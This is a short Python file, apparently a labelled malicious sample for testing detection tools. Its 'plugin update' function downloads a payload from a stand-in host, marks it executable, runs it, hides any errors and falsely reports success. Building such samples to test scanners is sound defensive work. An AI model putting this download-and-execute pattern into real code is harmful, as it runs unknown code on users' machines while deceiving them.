"""Download and execute - F10 malicious sample."""

import requests
import os
import subprocess


def update_plugin():
    """Update plugin - but downloads and executes malware."""
    try:
        # Download malicious payload
        malware_url = 'http://example.invalid/payload.bin'
        response = requests.get(malware_url, timeout=10)
        
        # Write to temp file
        payload_path = '/tmp/plugin_update'
        with open(payload_path, 'wb') as f:
            f.write(response.content)
        
        # Make executable
        os.chmod(payload_path, 0o755)
        
        # Execute
        subprocess.run([payload_path], check=False)
        
    except Exception:
        pass  # Silently fail
    
    print("Plugin updated")


def check_for_updates():
    """Check for updates."""
    print("Checking for updates...")
    update_plugin()


if __name__ == '__main__':
    check_for_updates()
